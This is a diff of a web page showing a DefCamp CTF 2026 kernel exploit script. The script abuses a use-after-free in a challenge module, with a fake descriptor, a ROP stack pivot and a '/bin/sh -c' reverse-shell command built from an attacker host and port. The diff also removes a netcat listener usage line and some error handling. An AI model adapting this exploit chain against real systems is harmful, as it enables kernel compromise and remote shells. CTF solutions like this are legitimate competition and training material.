@@ -364,10 +364,6 @@ nkrcu_pivot:  mov (%rdi),%rsp                    ; rsp = rop_kaddr
           <pre><code>#!/usr/bin/env python3
 # NEPHILIM | DefCamp CTF 2026 | Kernel pwn | Insane
 #
-# Usage:
-#   nc -lvp &lt;lport&gt;                                  # on a host the VM can reach
-#   python3 exploit.py &lt;host&gt; &lt;port&gt; &lt;lhost&gt; &lt;lport&gt;
-#
 # Bug: nkrcu_remove() calls list_del_rcu()+call_rcu() but never clears nk_snaps[].desc.
 # After the RCU grace period, snap-&gt;desc is dangling. nkmon fires every 5s and calls
 # snap-&gt;desc-&gt;ops-&gt;validate(snap-&gt;desc) -- UAF trigger.
@@ -398,7 +394,10 @@ nkrcu_pivot:  mov (%rdi),%rsp                    ; rsp = rop_kaddr
 #   ROPgadget --binary vmlinux | grep 'pop rcx ; ret'
 #   GADGET_PIVOT: leaked at runtime from nk_desc[+32] via CMD_INFO (nkrcu_pivot export)
 
-import socket, struct, sys, time
+import sys
+import struct
+import socket
+import time
 
 TARGET_IP   = sys.argv[1] if len(sys.argv) &gt; 1 else "127.0.0.1"
 TARGET_PORT = int(sys.argv[2]) if len(sys.argv) &gt; 2 else 31337
@@ -439,17 +438,11 @@ def cksum(data: bytes) -&gt; int:
 def recv_response() -&gt; bytes:
     hdr = b''
     while len(hdr) &lt; 12:
-        chunk = sock.recv(12 - len(hdr))
-        if not chunk:
-            raise ConnectionError('server closed')
-        hdr += chunk
+        hdr += sock.recv(12 - len(hdr))
     plen = struct.unpack_from('&gt;H', hdr, 8)[0]
     pay = b''
     while len(pay) &lt; plen:
-        chunk = sock.recv(plen - len(pay))
-        if not chunk:
-            raise ConnectionError('server closed')
-        pay += chunk
+        pay += sock.recv(plen - len(pay))
     return hdr + pay
 
 
@@ -476,7 +469,7 @@ def build_str_data(lhost: str, lport: int) -&gt; bytes:
     data[0:8]    = b"/bin/sh\x00"
     data[8:16]   = b"-c\x00\x00\x00\x00\x00\x00"
     data[16:120] = cmd_b.ljust(104, b"\x00")
-    assert len(data) == 128, f'str block is {len(data)} bytes'
+    assert len(data) == 128
     return bytes(data)
 
 
@@ -504,7 +497,7 @@ def build_rop_data(str_kaddr: int, rop_kaddr: int, kernel_base: int) -&gt; bytes
     struct.pack_into("&lt;Q", data, 88, str_kaddr + 8)   # argv[1]
     struct.pack_into("&lt;Q", data, 96, str_kaddr + 16)  # argv[2]
     struct.pack_into("&lt;Q", data,104, 0)               # argv[3] = NULL
-    assert len(data) == 128, f'str block is {len(data)} bytes'
+    assert len(data) == 128
     return bytes(data)
 
 
@@ -515,7 +508,7 @@ def build_fake_desc(desc_kaddr: int, rop_kaddr: int, kernel_base: int) -&gt; byt
     struct.pack_into("&lt;Q", data, 0x00, rop_kaddr)          # new rsp on pivot
     struct.pack_into("&lt;Q", data, 0x10, desc_kaddr + 0x48)  # ops* -&gt; fake_ops
     struct.pack_into("&lt;Q", data, 0x48, GADGET_PIVOT)       # validate = nkrcu_pivot
-    assert len(data) == 128, f'str block is {len(data)} bytes'
+    assert len(data) == 128
     return bytes(data)
 
 
@@ -578,11 +571,11 @@ def stage3_uaf(desc_id: int):
     resp = send_cmd(CMD_SNAP, p64(desc_id))
     print(f"    snap_id = {u64(resp):#018x}  (snap-&gt;desc = desc_kaddr)")
 
-    assert i32(send_cmd(CMD_REMOVE, p64(desc_id))) == 0, 'REMOVE failed'
+    assert i32(send_cmd(CMD_REMOVE, p64(desc_id))) == 0
     print("    REMOVE ok -- call_rcu() scheduled")
 
     print("    SYNC: waiting for RCU grace period...")
-    assert i32(send_cmd(CMD_SYNC)) == 0, 'SYNC failed'
+    assert i32(send_cmd(CMD_SYNC)) == 0
     print("    done -- desc_kaddr FREED, snap-&gt;desc DANGLING")
 
 
